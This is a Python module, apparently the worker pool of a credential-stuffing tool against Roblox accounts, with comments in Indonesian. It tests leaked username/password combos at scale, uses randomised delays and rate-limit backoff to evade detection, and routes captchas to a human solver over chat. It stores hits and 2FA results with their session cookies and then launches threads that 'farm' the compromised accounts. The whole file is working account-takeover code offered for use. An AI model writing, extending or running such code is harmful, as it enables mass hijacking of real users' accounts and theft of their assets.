import collections, random, threading, time

import config, farmer, rblx, store


class Gate:
    def __init__(self, lo, hi):
        self.lo, self.hi = lo, hi
        self._l = threading.Lock()
        self._next = 0.0

    def wait(self):
        with self._l:
            now = time.time()
            at = max(now, self._next)
            self._next = at + random.uniform(self.lo, self.hi)
        if at > now:
            time.sleep(at - now)

    def hold(self, secs):
        with self._l:
            self._next = max(self._next, time.time() + secs)


class Pool:
    def __init__(self, size, stop):
        self.size = max(1, size)
        self.stop = stop
        self.paused = True
        self.mode = config.CAPTCHA_MODE
        self.gate = Gate(config.MIN_DELAY, config.MAX_DELAY)
        self.lock = threading.Lock()
        self.stats = {"done": 0, "hit": 0, "retry": 0, "captcha": 0, "warm": 0}
        self.recent = collections.deque(maxlen=max(2, config.CAPTCHA_BREAKER_WINDOW))
        self.notify = None
        self.warm_lock = threading.Lock()
        self.warm_pending = None
        self.warm_token = None
        self.warm_event = threading.Event()
        self.warm_cool = 0.0
        self.farm_sem = threading.Semaphore(max(1, config.FARM_THREADS))

    def start(self):
        for i in range(self.size):
            threading.Thread(target=self._run, name="w%d" % i, daemon=True).start()

    def _bump(self, k):
        with self.lock:
            self.stats[k] = self.stats.get(k, 0) + 1

    def _note(self, status):
        with self.lock:
            self.recent.append(status)

    def captcha_rate(self):
        with self.lock:
            n = len(self.recent)
            if not n:
                return 0.0
            return sum(1 for s in self.recent if s == "captcha") / n

    def breaker_tripped(self):
        """True kalau IP udah ke-flag berat -> wajib warm."""
        with self.lock:
            n = len(self.recent)
            if n < self.recent.maxlen:
                return False
            c = sum(1 for s in self.recent if s == "captcha")
            return (c / n) > config.CAPTCHA_BREAKER_RATE

    def set_mode(self, mode):
        self.mode = "blast" if str(mode).lower() == "blast" else "auto"
        return self.mode

    def warm_status(self):
        with self.warm_lock:
            return self.warm_pending is not None

    def submit_warm(self, token):
        with self.warm_lock:
            if self.warm_pending is None:
                return False
            self.warm_token = token
            self.warm_event.set()
            return True

    def _try_warm(self, challenge, label):
        """Block sampai user kasih token atau timeout. None kalau gagal."""
        with self.warm_lock:
            if self.warm_pending is not None:
                return None
            self.warm_pending = challenge or {}
            self.warm_token = None
            self.warm_event.clear()
        blob = ((challenge or {}).get("inner") or {}).get("blob") or ""
        msg = ("== WARM NEEDED ==\nakun: %s\n\n1. buka %s\n2. tempel BLOB\n"
               "3. solve\n4. balas token ke chat ini\n\ntimeout %ds\n\nBLOB:\n%s"
               % (label, config.WARM_PAGE, int(config.WARM_TIMEOUT), blob[:1500]))
        if self.notify:
            try:
                self.notify(msg)
            except Exception:
                pass
        self.warm_event.wait(config.WARM_TIMEOUT)
        with self.warm_lock:
            token = self.warm_token
            self.warm_pending = None
            self.warm_token = None
        self._bump("warm")
        return token

    def _login(self, cli, u, p, headers=None):
        try:
            return cli.login(u, p, headers)
        except Exception as e:
            return "error", repr(e), None

    def _handle_captcha(self, cli, u, p, detail):
        self._bump("captcha")
        if self.mode != "auto" and not self.breaker_tripped():
            return "captcha", detail, None
        if time.time() < self.warm_cool:
            return "captcha", detail, None
        token = self._try_warm(cli.challenge, u)
        if not token:
            self.warm_cool = time.time() + config.WARM_RETRY
            return "captcha", detail, None
        if not cli.continue_challenge(token):
            self.warm_cool = time.time() + config.WARM_RETRY
            return "captcha", detail, None
        st, det, ck = self._login(cli, u, p, cli.challenge_headers())
        if st == "captcha":
            self.warm_cool = time.time() + config.WARM_RETRY
            return st, det, ck
        with self.lock:
            self.recent.clear()
        self.warm_cool = 0.0
        try:
            store.retry_captcha(config.MAX_CAPTCHA_TRIES)
        except Exception:
            pass
        return st, det, ck

    def _farm(self, u, cookie):
        with self.farm_sem:
            try:
                farmer.collect(u, cookie)
            except Exception:
                pass

    def _run(self):
        cli = rblx.Roblox()
        try:
            cli.csrf()
        except Exception:
            pass
        while not self.stop.is_set():
            if self.paused:
                time.sleep(1.0)
                continue
            if self.warm_pending is not None:
                time.sleep(0.5)
                continue
            job = store.claim_combo()
            if not job:
                time.sleep(2.0)
                continue
            u, p = job["username"], job["password"]
            self.gate.wait()
            status, detail, cookie = self._login(cli, u, p)

            if status == "captcha":
                status, detail, cookie = self._handle_captcha(cli, u, p, detail)
                if status == "captcha":
                    self._note("captcha")
                    store.mark_captcha(u, p, detail, config.CAPTCHA_DELAY,
                                       config.MAX_CAPTCHA_TRIES)
                    self._bump("retry")
                    cli.reset()
                    continue

            self._note(status)

            if status in ("ratelimited", "csrf", "error"):
                if status == "ratelimited":
                    try:
                        wait = min(300.0, float(detail) + 5)
                    except Exception:
                        wait = 60.0
                    self.gate.hold(wait)
                delay = {"error": config.RETRY_DELAY, "csrf": 5.0, "ratelimited": 0.0}[status]
                store.requeue(u, p, "%s %s" % (status, detail), delay, config.MAX_ATTEMPTS)
                self._bump("retry")
                continue

            if status == "hit":
                store.add_hit(u, p, cookie, "")
                store.finish_combo(u, p, "hit", "ok")
                self._bump("hit")
                if cookie:
                    threading.Thread(target=self._farm, args=(u, cookie),
                                     daemon=True).start()
                cli.reset()
            elif status == "2fa":
                store.add_hit(u, p, cookie, "2fa")
                store.finish_combo(u, p, "2fa", detail)
                if cookie:
                    threading.Thread(target=self._farm, args=(u, cookie),
                                     daemon=True).start()
                cli.reset()
            else:
                store.finish_combo(u, p, status, detail)
            self._bump("done")
